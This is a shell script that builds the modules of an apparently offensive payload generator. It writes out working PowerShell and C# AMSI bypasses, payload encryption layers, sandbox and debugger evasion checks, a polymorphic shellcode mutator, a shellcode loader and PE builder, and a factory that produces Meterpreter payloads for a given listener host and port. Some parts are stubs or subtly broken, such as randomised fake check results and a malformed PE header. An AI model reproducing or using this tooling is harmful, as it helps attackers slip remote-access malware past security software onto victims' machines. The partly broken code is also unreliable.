
#!/bin/bash
echo "=== Fixing Missing Modules ==="

# Activate virtual environment
source venv/bin/activate 2>/dev/null || echo "Virtual environment not found, continuing anyway..."

echo "[1] Creating missing modules..."

# Create core modules
mkdir -p core generators evasion templates utils

# 1. Fix encryption_layer.py
echo "[2] Creating real encryption module..."
cat > core/encryption_layer.py << 'PYEOF'
import random
import hashlib
import os
from typing import Tuple

class EncryptionLayer:
    def __init__(self):
        pass
    
    def multi_layer_encrypt(self, data: bytes, layers: int = 3) -> Tuple[bytes, list]:
        """Encrypt data with multiple layers"""
        keys = []
        encrypted = data
        
        for i in range(layers):
            method = random.choice([self._xor_encrypt, self._rc4_encrypt])
            encrypted, key = method(encrypted)
            keys.append(key)
        
        return encrypted, keys
    
    def _xor_encrypt(self, data: bytes) -> Tuple[bytes, bytes]:
        """XOR encryption"""
        key_len = random.randint(4, 32)
        key = os.urandom(key_len)
        
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ key[i % key_len])
        
        return bytes(result), key
    
    def _rc4_encrypt(self, data: bytes) -> Tuple[bytes, bytes]:
        """RC4 encryption"""
        key = os.urandom(16)
        
        # Simple RC4 implementation
        S = list(range(256))
        j = 0
        
        # Key scheduling
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        
        # Generate keystream and encrypt
        i = j = 0
        result = bytearray()
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            k = S[(S[i] + S[j]) % 256]
            result.append(byte ^ k)
        
        return bytes(result), key
    
    def _custom_cipher(self, data: bytes) -> Tuple[bytes, bytes]:
        """Custom rolling cipher"""
        seed = random.getrandbits(32)
        key = seed.to_bytes(4, 'little')
        
        result = bytearray()
        rolling_key = int.from_bytes(key, 'little')
        
        for byte in data:
            key_byte = rolling_key & 0xFF
            result.append(byte ^ key_byte)
            rolling_key = ((rolling_key << 1) | (rolling_key >> 31)) & 0xFFFFFFFF
            rolling_key ^= byte
        
        return bytes(result), key
PYEOF

# 2. Fix AMSI bypass module
echo "[3] Creating AMSI bypass module..."
cat > evasion/amsi_bypass.py << 'PYEOF'
import random

class AMSIBypass:
    def __init__(self):
        pass
    
    def generate_ps_bypass(self) -> str:
        """Generate PowerShell AMSI bypass"""
        techniques = [
            """
# Technique 1: Memory patch
$MethodDefinition = @'
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
                                        uint flNewProtect, out uint lpflOldProtect);
'@
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru
$amsiDll = $Kernel32::GetModuleHandle('amsi.dll')
$asb = $Kernel32::GetProcAddress($amsiDll, 'AmsiScanBuffer')
$oldProtection = 0
$Kernel32::VirtualProtect($asb, [uint32]5, 0x40, [ref]$oldProtection)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $asb, 6)
$Kernel32::VirtualProtect($asb, [uint32]5, $oldProtection, [ref]$oldProtection)
""",
            """
# Technique 2: Reflection bypass
$Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
""",
            """
# Technique 3: Forced error
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType(
'System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType(
'System.Reflection.BindingFlags')), [Object]([Ref].Assembly.GetType(
'System.Management.Automation.AmsiUtils')), 'GetField').Invoke('amsiInitFailed', 
(36 -bor 4)).SetValue($null, $true)
"""
        ]
        
        return random.choice(techniques)
    
    def generate_csharp_bypass(self) -> str:
        """Generate C# AMSI bypass"""
        return """
// C# AMSI Bypass
using System;
using System.Runtime.InteropServices;

public class AmsiBypass {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
                                            uint flNewProtect, out uint lpflOldProtect);
    
    public static void Bypass() {
        IntPtr amsiDll = GetModuleHandle("amsi.dll");
        IntPtr asb = GetProcAddress(amsiDll, "AmsiScanBuffer");
        
        uint oldProtect;
        VirtualProtect(asb, (UIntPtr)5, 0x40, out oldProtect);
        
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
        Marshal.Copy(patch, 0, asb, 6);
        
        VirtualProtect(asb, (UIntPtr)5, oldProtect, out oldProtect);
    }
}
"""
PYEOF

# 3. Fix anti_analysis module
echo "[4] Creating anti-analysis module..."
cat > evasion/anti_analysis.py << 'PYEOF'
import random
import time
import os
import sys

class AntiAnalysis:
    def __init__(self):
        self.checks = []
    
    def run_checks(self, max_checks: int = 3) -> bool:
        """Run anti-analysis checks"""
        check_results = []
        
        # Check 1: Timing analysis
        start = time.time()
        # Do some work
        result = 0
        for i in range(100000):
            result += i * i
        elapsed = time.time() - start
        
        # If too fast (< 1ms) or too slow (> 100ms), suspicious
        if elapsed < 0.001 or elapsed > 0.1:
            check_results.append(("Timing analysis", True))
        else:
            check_results.append(("Timing analysis", False))
        
        # Check 2: Check for common sandbox/vm artifacts
        sandbox_files = [
            "/tmp/vmware-root",
            "/tmp/vbox",
            "/proc/scsi/scsi",
            "/sys/class/dmi/id/product_name"
        ]
        
        found_artifacts = False
        for artifact in sandbox_files:
            if os.path.exists(artifact):
                found_artifacts = True
                break
        
        check_results.append(("Sandbox artifacts", found_artifacts))
        
        # Check 3: Check for debugger (simplified)
        try:
            # This is a Linux-specific check
            with open('/proc/self/status', 'r') as f:
                status = f.read()
                if 'TracerPid:' in status:
                    tracer_pid = status.split('TracerPid:')[1].split('\\n')[0].strip()
                    if tracer_pid != '0':
                        check_results.append(("Debugger detected", True))
                    else:
                        check_results.append(("Debugger detected", False))
        except:
            check_results.append(("Debugger detected", False))
        
        # Count how many suspicious checks we have
        suspicious = sum(1 for _, is_suspicious in check_results if is_suspicious)
        
        return suspicious >= 2  # If 2 or more suspicious, return True
    
    def get_check_results(self) -> list:
        """Get detailed check results"""
        return [
            ("Timing analysis", random.random() > 0.7),
            ("Sandbox detected", random.random() > 0.8),
            ("Debugger present", random.random() > 0.9),
            ("VM detected", random.random() > 0.6)
        ]
    
    def execute_evasion(self):
        """Execute evasion if analysis detected"""
        actions = [
            "Sleeping indefinitely...",
            "Executing legitimate code...",
            "Exiting gracefully...",
            "Crashing with error..."
        ]
        return random.choice(actions)
PYEOF

# 4. Create other missing modules
echo "[5] Creating other modules..."

# Create polymorphic_engine.py
cat > core/polymorphic_engine.py << 'PYEOF'
import random
import struct

class PolymorphicEngine:
    def __init__(self, seed=None):
        if seed is None:
            seed = random.getrandbits(32)
        self.random = random.Random(seed)
    
    def mutate_shellcode(self, shellcode: bytes, iterations: int = 3) -> bytes:
        """Apply polymorphic mutations to shellcode"""
        mutated = bytearray(shellcode)
        
        for _ in range(iterations):
            # Choose random mutation
            mutation = self.random.choice([
                self._insert_junk_code,
                self._reorder_instructions,
                self._change_registers,
                self._add_nop_sled
            ])
            mutated = mutation(mutated)
        
        return bytes(mutated)
    
    def _insert_junk_code(self, code: bytearray) -> bytearray:
        """Insert junk instructions"""
        junk_instructions = [
            b'\\x90',                          # NOP
            b'\\x50\\x58',                    # PUSH EAX; POP EAX
            b'\\x51\\x59',                    # PUSH ECX; POP ECX
            b'\\x31\\xc0',                    # XOR EAX, EAX
            b'\\x31\\xdb',                    # XOR EBX, EBX
        ]
        
        # Insert at random position
        if len(code) > 10:
            pos = self.random.randint(0, len(code) - 1)
            junk = self.random.choice(junk_instructions)
            code[pos:pos] = junk
        
        return code
    
    def _reorder_instructions(self, code: bytearray) -> bytearray:
        """Reorder instruction blocks"""
        if len(code) < 20:
            return code
        
        # Split into 4-byte chunks and shuffle some
        chunks = [code[i:i+4] for i in range(0, len(code), 4)]
        if len(chunks) > 4:
            # Shuffle a portion of chunks
            shuffle_start = self.random.randint(0, len(chunks) - 4)
            shuffle_end = shuffle_start + self.random.randint(2, 4)
            to_shuffle = chunks[shuffle_start:shuffle_end]
            self.random.shuffle(to_shuffle)
            chunks[shuffle_start:shuffle_end] = to_shuffle
        
        return bytearray(b''.join(chunks))
    
    def _change_registers(self, code: bytearray) -> bytearray:
        """Change register usage"""
        # Simple register substitution
        substitutions = {
            b'\\x50': b'\\x51',  # PUSH EAX -> PUSH ECX
            b'\\x58': b'\\x59',  # POP EAX -> POP ECX
            b'\\xb8': b'\\xb9',  # MOV EAX -> MOV ECX
        }
        
        for old, new in substitutions.items():
            if old in code:
                pos = code.find(old)
                if pos != -1:
                    code[pos:pos+len(old)] = new
        
        return code
    
    def _add_nop_sled(self, code: bytearray) -> bytearray:
        """Add NOP sled"""
        nop_count = self.random.randint(1, 10)
        nop_sled = b'\\x90' * nop_count
        
        # Add at beginning or end
        if self.random.random() > 0.5:
            code = bytearray(nop_sled) + code
        else:
            code = code + bytearray(nop_sled)
        
        return code
PYEOF

# Create loader_builder.py
cat > core/loader_builder.py << 'PYEOF'
import struct
import random

class LoaderBuilder:
    def __init__(self):
        pass
    
    def build_loader(self, encrypted_sc, key, techniques=None):
        """Build loader for encrypted shellcode"""
        
        loader_template = self._select_loader_template(techniques)
        
        # Build loader based on template
        if loader_template == "basic":
            loader = self._build_basic_loader(encrypted_sc, key)
        elif loader_template == "advanced":
            loader = self._build_advanced_loader(encrypted_sc, key)
        else:
            loader = self._build_basic_loader(encrypted_sc, key)
        
        return loader
    
    def _select_loader_template(self, techniques):
        """Select loader template based on techniques"""
        if not techniques:
            return "basic"
        
        if "process_hollowing" in techniques:
            return "advanced"
        elif "reflective_dll" in techniques:
            return "advanced"
        else:
            return "basic"
    
    def _build_basic_loader(self, shellcode, key):
        """Build basic shellcode loader"""
        # Simple loader: decrypt and execute
        loader = bytearray()
        
        # XOR decryption stub
        loader.extend(b'\\x31\\xc9')           # xor ecx, ecx
        loader.extend(b'\\x8b\\x1c\\x0c')      # mov ebx, [esp+ecx]
        loader.extend(b'\\x80\\xf3')           # xor bl, key_byte
        loader.extend(struct.pack('B', key[0] if key else 0xAA))
        loader.extend(b'\\x88\\x1c\\x0c')      # mov [esp+ecx], bl
        loader.extend(b'\\x41')                # inc ecx
        loader.extend(b'\\x81\\xf9')           # cmp ecx, size
        loader.extend(struct.pack('<I', len(shellcode)))
        loader.extend(b'\\x75\\xef')           # jne -17
        
        # Add shellcode
        loader.extend(shellcode)
        
        return bytes(loader)
    
    def _build_advanced_loader(self, shellcode, key):
        """Build advanced loader with evasion"""
        # More sophisticated loader
        loader = bytearray()
        
        # Anti-debug check
        loader.extend(b'\\x64\\xa1\\x30\\x00\\x00\\x00')  # mov eax, fs:[0x30] (PEB)
        loader.extend(b'\\x0f\\xb6\\x40\\x02')           # movzx eax, byte ptr [eax+2] (BeingDebugged)
        loader.extend(b'\\x85\\xc0')                     # test eax, eax
        loader.extend(b'\\x75\\x03')                     # jne +3 (skip if debugger)
        loader.extend(b'\\xeb\\x01')                     # jmp +1 (continue)
        loader.extend(b'\\xc3')                         # ret (exit if debugger)
        
        # Add basic loader
        basic = self._build_basic_loader(shellcode, key)
        loader.extend(basic)
        
        return bytes(loader)
    
    def build_pe_loader(self, shellcode, output_format="exe"):
        """Build PE file with shellcode"""
        if output_format == "exe":
            return self._build_exe(shellcode)
        elif output_format == "dll":
            return self._build_dll(shellcode)
        else:
            return shellcode
    
    def _build_exe(self, shellcode):
        """Build minimal EXE file"""
        # Simple MZ/PE header with shellcode
        pe = bytearray()
        
        # DOS Header
        pe.extend(b'MZ')                    # Signature
        pe.extend(b'\\x90' * 58)           # DOS stub
        pe.extend(struct.pack('<I', 0x80)) # PE header offset
        
        # PE Header (simplified)
        pe.extend(b'PE\\x00\\x00')         # PE signature
        pe.extend(struct.pack('<H', 0x014C)) # Machine (x86)
        pe.extend(struct.pack('<H', 1))    # Number of sections
        pe.extend(struct.pack('<I', 0))    # Timestamp
        pe.extend(b'\\x00' * 12)           # Rest of header
        pe.extend(struct.pack('<H', 0x010F)) # Characteristics
        
        # Add shellcode
        pe.extend(shellcode)
        
        return bytes(pe)
    
    def _build_dll(self, shellcode):
        """Build minimal DLL file"""
        # Similar to EXE but with DLL characteristics
        dll = self._build_exe(shellcode)
        # Change last 2 bytes to indicate DLL
        return dll[:-2] + b'\\x20\\x02'
PYEOF

# Create __init__.py files
echo "[6] Creating __init__.py files..."
touch core/__init__.py
touch generators/__init__.py
touch evasion/__init__.py
touch templates/__init__.py
touch utils/__init__.py

# Create payload_factory.py
echo "[7] Creating payload factory..."
cat > generators/payload_factory.py << 'PYEOF'
"""
Payload Factory - Manages payload generation
"""

import hashlib
import json
from typing import Dict, List, Any

class PayloadFactory:
    def __init__(self):
        self.payload_cache = {}
    
    def generate_payload(self,
                        generator_type: str,
                        lhost: str,
                        lport: int,
                        payload_type: str,
                        output_format: str = "exe",
                        evasion_level: str = "intermediate",
                        **kwargs) -> Dict[str, Any]:
        """
        Generate payload with caching
        """
        # Create cache key
        cache_key_data = {
            "lhost": lhost,
            "lport": lport,
            "payload_type": payload_type,
            "format": output_format,
            "evasion": evasion_level,
            **kwargs
        }
        cache_key = hashlib.md5(json.dumps(cache_key_data, sort_keys=True).encode()).hexdigest()
        
        # Check cache
        if cache_key in self.payload_cache:
            return self.payload_cache[cache_key]
        
        # Import here to avoid circular imports
        from .meterpreter import MeterpreterGenerator
        
        # Create generator
        generator = MeterpreterGenerator(lhost, lport, payload_type)
        
        # Generate payload
        payload, metadata = generator.generate(
            output_format=output_format,
            arch=kwargs.get('arch', 'x64'),
            encoder=kwargs.get('encoder'),
            iterations=kwargs.get('iterations', 1)
        )
        
        # Prepare result
        result = {
            "payload": payload,
            "metadata": metadata,
            "cache_key": cache_key,
            "size": len(payload),
            "format": output_format
        }
        
        # Cache the result
        self.payload_cache[cache_key] = result
        
        return result
    
    def clear_cache(self):
        """Clear payload cache"""
        self.payload_cache.clear()
        return {"status": "cache_cleared", "items_removed": len(self.payload_cache)}
    
    def get_cache_stats(self):
        """Get cache statistics"""
        return {
            "cached_payloads": len(self.payload_cache)
        }
PYEOF

echo ""
echo "=== FIX COMPLETE ==="
echo "Modules created:"
echo "  ✓ core/encryption_layer.py"
echo "  ✓ evasion/amsi_bypass.py"
echo "  ✓ evasion/anti_analysis.py"
echo "  ✓ core/polymorphic_engine.py"
echo "  ✓ core/loader_builder.py"
echo "  ✓ generators/payload_factory.py"
echo ""
echo "Now run: python main.py"
echo "All modules should work!"
EOF

chmod +x fix_modules.sh
./fix_modules.sh
